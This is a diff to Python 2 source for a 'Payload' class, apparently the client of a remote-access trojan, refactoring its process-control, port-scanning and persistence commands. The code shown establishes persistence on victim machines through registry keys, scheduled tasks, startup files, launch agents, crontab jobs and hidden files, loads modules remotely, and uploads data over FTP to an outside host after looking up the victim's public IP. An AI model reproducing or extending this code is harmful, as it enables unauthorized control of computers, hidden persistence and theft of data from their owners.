@@ -18,16 +18,13 @@ import urllib
 import urllib2
 import zipfile
 import logging
+import StringIO
 import functools
 import threading
 import subprocess
 import contextlib
 import collections
 import logging.handlers
-try:
-    from cStringIO import StringIO
-except:
-    from StringIO import StringIO
 
 def config(*arg, **options):
     """ 
@@ -272,7 +269,7 @@ class Payload():
             elif hasattr(source, 'seek'):
                 source.seek(0)
             else:
-                source = StringIO(bytes(source))
+                source = StringIO.StringIO(bytes(source))
             host = ftplib.FTP(host=host, user=user, password=password)
             addr = urllib2.urlopen('http://api.ipify.org').read()
             if 'tmp' not in host.nlst():
@@ -729,7 +726,7 @@ class Payload():
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32'], buffer=StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
+    @config(platforms=['win32'], command=True, usage='process <mode>')
     def process(self, args=None):
         """ 
         Utility method for interacting with processes
@@ -744,20 +741,24 @@ class Payload():
         try:
             if 'process' not in globals():
                 process = self.remote_import('process')
-            elif not args:
-                return self.ps.usage
-            else:
-                cmd, _, action = str(args).partition(' ')
-                if hasattr(process, cmd):
-                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
+            if not args:
+                if hasattr(process, 'usage'):
+                    return process.usage
+                elif hasattr(self.process, 'usage'):
+                    return self.process.usage
                 else:
-                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
+                    return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
+            cmd, _, action = str(args).partition(' ')
+            if hasattr(process, cmd):
+                return getattr(process, cmd)(action) if action else getattr(process, cmd)()
+            else:
+                return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
             debug("{} error: {}".format(self.process.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
-    def portscan(self, args):
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
+    def portscan(self, args=None):
         """ 
         Scan a target host or network to identify 
         other target hosts and open ports.
@@ -770,7 +771,11 @@ class Payload():
         if 'portscan' not in globals():
             portscan = self.remote_import('portscan')
         try:
+            if not args:
+                return 'portscan <mode> <target>'
             mode, _, target = str(args).partition(' ')
+            if not mode:
+                return 'portscan <mode> <target>'
             if target:
                 if not ipv4(target):
                     return "Error: invalid IP address '%s'" % target
@@ -883,7 +888,7 @@ class Payload():
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
-    def persistence(self, args):
+    def persistence(self, args=None):
         """ 
         Establish persistence on client host machine
 
@@ -892,26 +897,25 @@ class Payload():
         :param str target:    run, abort, methods, results
 
         `Methods`
-        :method all:                All Methods
-        :method registry_key:       Windows Registry Key
-        :method scheduled_task:     Windows Task Scheduler
-        ;method startup_file:       Windows Startup File
-        :method launch_agent:       Mac OS X Launch Agent
-        :method crontab_job:        Linux Crontab Job
-        :method hidden_file:        Hidden File
+          :method all:                All Methods
+          :method registry_key:       Windows Registry Key
+          :method scheduled_task:     Windows Task Scheduler
+          :method startup_file:       Windows Startup File
+          :method launch_agent:       Mac OS X Launch Agent
+          :method crontab_job:        Linux Crontab Job
+          :method hidden_file:        Hidden File
         
         """
         try:
             if not 'persistence' in globals():
                 persistence = self.remote_import('persistence')
-            else:
-                cmd, _, action = str(args).partition(' ')
-                if cmd not in ('add','remove'):
-                    return self.persistence.usage + str('\nmethods: %s' % ', '.join(persistence.methods()))
-                for method in methods:
-                    if method == 'all' or action == method:
-                        persistence.methods[method].established, persistence.methods[method].result = persistence.methods[method].add()
-                return json.dumps(persistence.results())
+            cmd, _, action = str(args).partition(' ')
+            if cmd not in ('add','remove'):
+                return self.persistence.usage + str('\nmethods: %s' % ', '.join(persistence.methods()))
+            for method in methods:
+                if method == 'all' or action == method:
+                    persistence.methods[method].established, persistence.methods[method].result = persistence.methods[method].add()
+            return json.dumps(persistence.results())
         except Exception as e:
             debug("{} error: {}".format(self.persistence.func_name, str(e)))
         return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
